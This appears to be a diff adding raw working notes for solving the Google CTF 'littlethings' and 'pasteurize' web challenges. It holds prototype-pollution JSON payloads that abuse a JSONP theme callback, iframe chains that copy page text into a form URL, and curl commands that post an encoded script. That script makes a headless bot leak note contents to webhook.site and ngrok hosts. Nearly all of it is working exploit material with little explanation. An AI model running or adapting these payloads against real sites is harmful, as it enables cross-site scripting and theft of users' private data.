@@ -1,0 +1,100 @@
+?__debug__:
+	window.name = form.json.value;
+
+utils.js
+	fetch('/me').then(e => e.json()).then(make_user_object);
+
+user.js
+	const user = new User(obj.username, obj.img, obj.theme);
+    window.load_debug?.(user);
+
+debug.js
+	debug = JSON.parse(window.name);
+
+user.js
+	window.USERNAME = user.toString();
+    document[window.USERNAME] = user;
+	update_theme();
+
+theme.js
+	const theme = document[USERNAME].theme;
+    const s = document.createElement('script');
+    s.src = `/theme?cb=${theme.cb}`;
+    document.head.appendChild(s);
+
+# Override the Callback
+{
+   "__proto__": {},
+   "theme": {
+      "cb": "alert"
+   }
+}
+
+# Abusing the Callback
+{
+   "__proto__": {},
+   "theme": {
+      "cb": "document.body.innerHTML=window.name.toString"
+   },
+   "htmlGoesHere": "<h1>Hi!</h1>"
+}
+
+# Mulitple Callbacks
+{
+   "__proto__":{},
+   "theme":{
+      "cb":"document.body.innerHTML=window.name.toString"
+   },
+   "htmlGoesHere": "<iframe srcdoc='<script src=/theme?cb=window.top.document.body.innerHTML=window.top.location.search.toString></script>'>"
+}
+
+
+
+{
+   "__proto__":{},
+   "theme":{
+      "cb":"document.body.firstElementChild.innerHTML=window.name.toString"
+   },
+   "payload":[
+      "<form id='concat'>https://0b7660a35154.ngrok.io/?<div></div></form>",
+      "<iframe srcdoc='<script src=/theme?cb=window.top.concat.firstElementChild.innerText=window.top.document.body.innerText.toString></script>'></iframe>",
+      "<iframe srcdoc='<script src=/theme?cb=window.top.location.href=window.top.concat.innerText.toString></script>'></iframe>"
+   ]
+}
+
+# Get innerText from 'https://littlethings.web.ctfcompetition.com/note' => Get Note GUID
+{
+	"__proto__": {},
+	"theme": {
+		"cb": "document.body.firstElementChild.innerHTML=window.name.toString"
+	},
+	"img": "/",
+	"payload": [
+		"<form id='concat'>https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd/?<div></div></form>",
+		"<iframe srcdoc='<script src=/theme?cb=window.top.concat.firstElementChild.innerText=window.top.document.body.innerText.toString></script>'></iframe>",
+		"<iframe srcdoc='<script src=/theme?cb=window.top.location.href=window.top.concat.innerText.toString></script>'></iframe>"
+	]
+}
+
+## Get rid of spaces
+{"__proto__": {},"theme": {"cb": "document.body.firstElementChild.innerHTML=window.name.toString"},"img": "/","payload": ["<form id='concat'>https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd/?<div></div></form>","<iframe srcdoc='<script src=/theme?cb=window.top.concat.firstElementChild.innerText=window.top.document.body.innerText.toString></script>'></iframe>","<iframe srcdoc='<script src=/theme?cb=window.top.location.href=window.top.concat.innerText.toString></script>'></iframe>"]}
+
+# base64 encode and urlencode
+# Make post
+curl 'https://pasteurize.web.ctfcompetition.com/' --data-raw 'content[]=;window.name=atob(`%65%79%4a%66%58%33%42%79%62%33%52%76%58%31%38%69%4f%69%42%37%66%53%77%69%64%47%68%6c%62%57%55%69%4f%69%42%37%49%6d%4e%69%49%6a%6f%67%49%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%4a%76%5a%48%6b%75%5a%6d%6c%79%63%33%52%46%62%47%56%74%5a%57%35%30%51%32%68%70%62%47%51%75%61%57%35%75%5a%58%4a%49%56%45%31%4d%50%58%64%70%62%6d%52%76%64%79%35%75%59%57%31%6c%4c%6e%52%76%55%33%52%79%61%57%35%6e%49%6e%30%73%49%6d%6c%74%5a%79%49%36%49%43%49%76%49%69%77%69%63%47%46%35%62%47%39%68%5a%43%49%36%49%46%73%69%50%47%5a%76%63%6d%30%67%61%57%51%39%4a%32%4e%76%62%6d%4e%68%64%43%63%2b%61%48%52%30%63%48%4d%36%4c%79%39%33%5a%57%4a%6f%62%32%39%72%4c%6e%4e%70%64%47%55%76%4d%54%49%31%4f%54%41%30%4e%57%59%74%4d%44%63%32%5a%43%30%30%4f%57%51%33%4c%54%6b%30%4d%7a%55%74%5a%54%46%6b%4f%44%41%31%4f%44%63%35%4f%57%5a%6b%4c%7a%38%38%5a%47%6c%32%50%6a%77%76%5a%47%6c%32%50%6a%77%76%5a%6d%39%79%62%54%34%69%4c%43%49%38%61%57%5a%79%59%57%31%6c%49%48%4e%79%59%32%52%76%59%7a%30%6e%50%48%4e%6a%63%6d%6c%77%64%43%42%7a%63%6d%4d%39%4c%33%52%6f%5a%57%31%6c%50%32%4e%69%50%58%64%70%62%6d%52%76%64%79%35%30%62%33%41%75%59%32%39%75%59%32%46%30%4c%6d%5a%70%63%6e%4e%30%52%57%78%6c%62%57%56%75%64%45%4e%6f%61%57%78%6b%4c%6d%6c%75%62%6d%56%79%56%47%56%34%64%44%31%33%61%57%35%6b%62%33%63%75%64%47%39%77%4c%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%4a%76%5a%48%6b%75%61%57%35%75%5a%58%4a%55%5a%58%68%30%4c%6e%52%76%55%33%52%79%61%57%35%6e%50%6a%77%76%63%32%4e%79%61%58%42%30%50%69%63%2b%50%43%39%70%5a%6e%4a%68%62%57%55%2b%49%69%77%69%50%47%6c%6d%63%6d%46%74%5a%53%42%7a%63%6d%4e%6b%62%32%4d%39%4a%7a%78%7a%59%33%4a%70%63%48%51%67%63%33%4a%6a%50%53%39%30%61%47%56%74%5a%54%39%6a%59%6a%31%33%61%57%35%6b%62%33%63%75%64%47%39%77%4c%6d%78%76%59%32%46%30%61%57%39%75%4c%6d%68%79%5a%57%59%39%64%32%6c%75%5a%47%39%33%4c%6e%52%76%63%43%35%6a%62%32%35%6a%59%58%51%75%61%57%35%75%5a%58%4a%55%5a%58%68%30%4c%6e%52%76%55%33%52%79%61%57%35%6e%50%6a%77%76%63%32%4e%79%61%58%42%30%50%69%63%2b%50%43%39%70%5a%6e%4a%68%62%57%55%2b%49%6c%31%39`);if(navigator.userAgent.includes(`Headless`))location.href=`https://littlethings.web.ctfcompetition.com/note?__debug__`;//'
+
+Found. Redirecting to /c8449637-aab0-4885-b8fd-31234d4e2699
+https://pasteurize.web.ctfcompetition.com/c8449637-aab0-4885-b8fd-31234d4e2699
+share with TJMike
+
+Note (All 3 notes have flag):
+	22f23db6-a432-408b-a3e9-40fe258d500f
+	f65ee90c-a06f-4055-ac8a-f2416005479b
+	2b34a8b3-6f08-40b4-a30c-c51ebb763231
+
+
+# Get note content
+Only change the part location.href to `https://littlethings.web.ctfcompetition.com/note/<note id>?__debug__
+# Make post
+
+curl 'https://pasteurize.web.ctfcompetition.com/' --data-raw 'content[]=;window.name=atob(`%65%79%4a%66%58%33%42%79%62%33%52%76%58%31%38%69%4f%69%42%37%66%53%77%69%64%47%68%6c%62%57%55%69%4f%69%42%37%49%6d%4e%69%49%6a%6f%67%49%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%4a%76%5a%48%6b%75%5a%6d%6c%79%63%33%52%46%62%47%56%74%5a%57%35%30%51%32%68%70%62%47%51%75%61%57%35%75%5a%58%4a%49%56%45%31%4d%50%58%64%70%62%6d%52%76%64%79%35%75%59%57%31%6c%4c%6e%52%76%55%33%52%79%61%57%35%6e%49%6e%30%73%49%6d%6c%74%5a%79%49%36%49%43%49%76%49%69%77%69%63%47%46%35%62%47%39%68%5a%43%49%36%49%46%73%69%50%47%5a%76%63%6d%30%67%61%57%51%39%4a%32%4e%76%62%6d%4e%68%64%43%63%2b%61%48%52%30%63%48%4d%36%4c%79%39%33%5a%57%4a%6f%62%32%39%72%4c%6e%4e%70%64%47%55%76%4d%54%49%31%4f%54%41%30%4e%57%59%74%4d%44%63%32%5a%43%30%30%4f%57%51%33%4c%54%6b%30%4d%7a%55%74%5a%54%46%6b%4f%44%41%31%4f%44%63%35%4f%57%5a%6b%4c%7a%38%38%5a%47%6c%32%50%6a%77%76%5a%47%6c%32%50%6a%77%76%5a%6d%39%79%62%54%34%69%4c%43%49%38%61%57%5a%79%59%57%31%6c%49%48%4e%79%59%32%52%76%59%7a%30%6e%50%48%4e%6a%63%6d%6c%77%64%43%42%7a%63%6d%4d%39%4c%33%52%6f%5a%57%31%6c%50%32%4e%69%50%58%64%70%62%6d%52%76%64%79%35%30%62%33%41%75%59%32%39%75%59%32%46%30%4c%6d%5a%70%63%6e%4e%30%52%57%78%6c%62%57%56%75%64%45%4e%6f%61%57%78%6b%4c%6d%6c%75%62%6d%56%79%56%47%56%34%64%44%31%33%61%57%35%6b%62%33%63%75%64%47%39%77%4c%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%4a%76%5a%48%6b%75%61%57%35%75%5a%58%4a%55%5a%58%68%30%4c%6e%52%76%55%33%52%79%61%57%35%6e%50%6a%77%76%63%32%4e%79%61%58%42%30%50%69%63%2b%50%43%39%70%5a%6e%4a%68%62%57%55%2b%49%69%77%69%50%47%6c%6d%63%6d%46%74%5a%53%42%7a%63%6d%4e%6b%62%32%4d%39%4a%7a%78%7a%59%33%4a%70%63%48%51%67%63%33%4a%6a%50%53%39%30%61%47%56%74%5a%54%39%6a%59%6a%31%33%61%57%35%6b%62%33%63%75%64%47%39%77%4c%6d%78%76%59%32%46%30%61%57%39%75%4c%6d%68%79%5a%57%59%39%64%32%6c%75%5a%47%39%33%4c%6e%52%76%63%43%35%6a%62%32%35%6a%59%58%51%75%61%57%35%75%5a%58%4a%55%5a%58%68%30%4c%6e%52%76%55%33%52%79%61%57%35%6e%50%6a%77%76%63%32%4e%79%61%58%42%30%50%69%63%2b%50%43%39%70%5a%6e%4a%68%62%57%55%2b%49%6c%31%39`);if(navigator.userAgent.includes(`Headless`))location.href=`https://littlethings.web.ctfcompetition.com/note/22f23db6-a432-408b-a3e9-40fe258d500f?__debug__`;//'
